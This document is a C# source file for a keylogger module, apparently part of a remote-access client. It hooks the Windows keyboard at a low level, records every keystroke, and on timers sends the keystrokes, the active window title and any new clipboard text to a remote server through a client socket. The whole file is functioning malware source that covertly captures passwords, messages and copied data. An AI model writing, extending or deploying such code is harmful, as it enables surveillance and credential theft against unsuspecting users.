using System.Collections.Concurrent;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Client.Conexion;

namespace Client
{
    static class Keylogger
    {
        // Hook
        private static IntPtr _hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static Thread _hookThread;

        // Buffer y envío
        private static readonly ConcurrentQueue<string> _queue = new ConcurrentQueue<string>();
        private static System.Threading.Timer _sendTimer;

        // Active window
        private static System.Threading.Timer _windowTimer;

        // Clipboard
        private static System.Threading.Timer _clipboardTimer;
        private static string _lastClipboard = "";

        // P/Invoke
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        private static bool shiftPresionado = (GetAsyncKeyState(160) & 0x8000) != 0 || (GetAsyncKeyState(161) & 0x8000) != 0;

        public static void Start()
        {
            // Arrancar el hook en un hilo STA con message loop
            _hookThread = new Thread(() =>
            {
                _hookId = SetHook(_proc);
                Application.Run(); // Mantiene vivo el hook
            });
            _hookThread.SetApartmentState(ApartmentState.STA);
            _hookThread.IsBackground = true;
            _hookThread.Start();

            // Timer de envío cada 2s
            _sendTimer = new System.Threading.Timer(_ =>
            {
                if (!_queue.IsEmpty)
                {
                    var sb = new StringBuilder();
                    while (_queue.TryDequeue(out var s))
                        sb.Append(s);
                    var payload = sb.ToString();
                    if (payload.Length > 0)
                        ClientSocket.SendResponse(payload, Channel.Keylogger);
                }
            }, null, 2000, 2000);

            // Timer ventana activa cada 3s
            _windowTimer = new System.Threading.Timer(_ =>
            {
                string title = GetActiveWindowTitle();
                ClientSocket.SendResponse(title, Channel.ActiveWindow);
            }, null, 0, 3000);

            // Timer clipboard cada 5s
            _clipboardTimer = new System.Threading.Timer(_ =>
            {
                var clip = GetClipboardText();
                if (!string.IsNullOrEmpty(clip) && clip != _lastClipboard)
                {
                    _lastClipboard = clip;
                    ClientSocket.SendResponse(clip, Channel.Clipboard);
                }
            }, null, 0, 5000);
        }
        public static void Stop()
        {
            if (_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }
            if (_hookThread != null)
            {
                Application.ExitThread(); // Para el message loop
                _hookThread = null;
            }
            _sendTimer?.Dispose();
            _windowTimer?.Dispose();
            _clipboardTimer?.Dispose();
            while (_queue.TryDequeue(out _)) { }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using var curProc = Process.GetCurrentProcess();
            using var curMod = curProc.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curMod.ModuleName), 0);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string s = VkCodeToString(vkCode);
                if (!string.IsNullOrEmpty(s))
                    _queue.Enqueue(s);
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }


        private static string VkCodeToString(int code)
        {
            bool shift = (Control.ModifierKeys & Keys.Shift) != 0;
            // Letras
            if (code >= 65 && code <= 90)
                return shift ? ((char)code).ToString() :
                    ((char)(code + 32)).ToString();
            // Números
            if (code >= 48 && code <= 57)
                return ((char)code).ToString();
            // Teclas especiales
            return code switch
            {
                13 => "[Enter]",  // Enter
                8 => "[Back]",     // Backspace
                32 => "[Space]",         // Space
                9 => "[Tab]",      // Tab
                27 => "[Esc]",     // Escape
                190 => shiftPresionado ? ">" : ".", // Punto o mayor que
                188 => shiftPresionado ? "<" : ",", // Coma o menor que
                191 => shiftPresionado ? "?" : "/", // Barra o signo de interrogación
                186 => shiftPresionado ? ":" : ";", // Punto y coma o dos puntos
                222 => shiftPresionado ? "\"" : "'", // Comillas dobles o simples
                189 => shiftPresionado ? "_" : "-", // Guion bajo o guion
                187 => shiftPresionado ? "+" : "=", // Más o igual
                192 => shiftPresionado ? "~" : "", // Tilde o acento grave
                219 => shiftPresionado ? "{" : "[", // Llave izquierda o corchete izquierdo
                220 => shiftPresionado ? "|" : "\\", // Barra vertical o barra invertida
                226 => shiftPresionado ? "\"" : "~", // Tilde inversa o barra
                33 => "!",         // Exclamación "!"
                64 => "@",         // Arroba "@"
                35 => "#",         // Numeral "#"
                36 => "$",         // Dólar "$"
                37 => "%",         // Porcentaje "%"
                94 => "^",         // Acento circunflejo "^"
                38 => "&",         // Ampersand "&"
                42 => "*",         // Asterisco "*"
                40 => "(",         // Paréntesis izquierdo "("
                41 => ")",         // Paréntesis derecho ")"
                95 => "_",         // Guion bajo "_"
                43 => "+",         // Más "+"
                _ => ""            // Otros códigos no mapeados
            };
        }

        private static string GetActiveWindowTitle()
        {
            IntPtr hwnd = GetForegroundWindow();
            var sb = new StringBuilder(256);
            if (GetWindowText(hwnd, sb, sb.Capacity) > 0)
                return sb.ToString();
            return "";
        }

        private static string GetClipboardText()
        {
            string text = null;
            var t = new Thread(() =>
            {
                try { text = Clipboard.GetText(); }
                catch { /* Acceso fallido */ }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
            t.Join(500);
            return text ?? "";
        }
    }
}